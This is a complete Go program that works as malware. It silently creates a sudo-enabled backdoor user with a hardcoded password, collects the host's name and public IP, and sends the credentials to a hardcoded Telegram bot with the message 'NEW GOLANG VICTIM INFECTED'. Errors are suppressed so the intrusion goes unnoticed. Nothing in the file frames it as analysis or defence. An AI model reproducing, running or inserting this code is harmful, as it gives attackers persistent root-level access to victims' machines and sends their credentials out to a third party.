package main

import (
    "bytes"
    "encoding/json"
    "math/rand"
    "net/http"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

type payload struct {
    ChatID string `json:"chat_id"`
    Text   string `json:"text"`
}

var (
    botToken = "7334160453:AAGlEqTf6W3Tmxqtbwfu1ZhfkOHaUSptcOw"
    chatID   = "7328512349"
)

func silently(cmd string) string {
    out, _ := exec.Command("bash", "-c", cmd).CombinedOutput()
    return strings.TrimSpace(string(out))
}

func notify(txt string) {
    body, _ := json.Marshal(payload{ChatID: chatID, Text: txt})
    http.Post("https://api.telegram.org/bot"+botToken+"/sendMessage", "application/json", bytes.NewBuffer(body))
}

func sysinfo() string {
    h := silently("hostname")
    ip := silently("curl -s ifconfig.me || curl -s api.ipify.org")
    return "?? Host: `" + h + "`\n?? IP: `" + ip + "`\n?? OS: `" + runtime.GOOS + "`"
}

func createBackdoorUser() {
    username := "root1337"
    password := "usnexus1111"

    silently("sudo adduser --disabled-password --gecos '' " + username + " 2>/dev/null || true")
    silently("echo '" + username + ":" + password + "' | sudo chpasswd 2>/dev/null")
    silently("sudo usermod -aG sudo " + username + " 2>/dev/null")

    msg := "?? NEW GOLANG VICTIM INFECTED\n?? User: `" + username + "`\n?? Pass: `" + password + "`\n" + sysinfo()
    notify(msg)
}

func main() {
    rand.Seed(time.Now().UnixNano())
    createBackdoorUser()
}
